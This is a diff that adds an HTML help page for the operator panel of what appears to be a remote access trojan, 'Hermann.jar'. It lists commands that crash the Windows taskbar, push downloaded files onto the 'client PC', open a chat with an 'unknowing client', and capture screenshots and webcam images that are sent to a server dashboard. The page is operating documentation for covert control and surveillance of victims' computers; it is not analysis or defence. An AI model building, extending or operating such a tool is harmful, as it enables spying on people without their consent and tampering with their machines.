@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>Help page</title>
+    <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"
+          integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css"
+          integrity="sha384-lKuwvrZot6UHsBSfcMvOkWwlCMgc0TaWr+30HWe3a4ltaBwTZhyTEggF5tJv8tbt" crossorigin="anonymous">
+    <link rel="stylesheet" th:href="'../style.css'">
+
+</head>
+<body>
+
+
+<div class="card card-body darker hidden-md-up">
+    <div class="darker">
+        <h1>Help</h1>
+        <div class="card">
+            <div class="card-header">
+                Commands
+            </div>
+            <div class="card-body">
+                <div class="card-body">
+                    <pre class="card-body console console-text">ls [path]</pre>
+                    <br>
+                    <p>Lists all files</p>
+                    <p>With parameter [path] a specified path can be added</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">pwd</pre>
+                    <br>
+                    <p>Shows the paths to 'current working dir', 'user home dir' and 'java home'</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">kill</pre>
+                    <br>
+                    <p>Crashes the widows tas bar and other windows functions. Not lethal</p>
+                    <p>Can be fixed with running 'start explorer' in a console</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">desktop</pre>
+                    <br>
+                    <p>Minimizes all open windows to task tray (Same as Win+D)</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">printers</pre>
+                    <br>
+                    <p>Shows all available Printers</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">download {fromUrl} {toPath}</pre>
+                    <br>
+                    <p>Downloads a file from Url to client PC to given path + file to paste in</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">chat {message}</pre>
+                    <br>
+                    <p>Shows Chat window on client PC to chat with unknowing client</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">screenshot</pre>
+                    <br>
+                    <p>Creates Screenshot of client PC. Can take up to 30 seconds to send to server...</p>
+                    <p>Img will be shown at the bottom of the Client Dashboard</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">webcam</pre>
+                    <br>
+                    <p>Creates img with client webcam. if no webcam installed can crash Hermann.jar</p>
+                    <p>Can take up to 30 seconds to send to server...</p>
+                    <p>Img will be shown at the bottom of the Client Dashboard</p>
+                </div>
+                <br>
+                <div class="card-body">
+                    <pre class="card-body console console-text">tasks</pre>
+                    <br>
+                    <p>Shows all tasks of currently running Pc</p>
+                </div>
+            </div>
+        </div>
+        <br>
+        <a class="btn btn-primary" href="/">Back</a>
+    </div>
+</div>
+</body>
+</html>
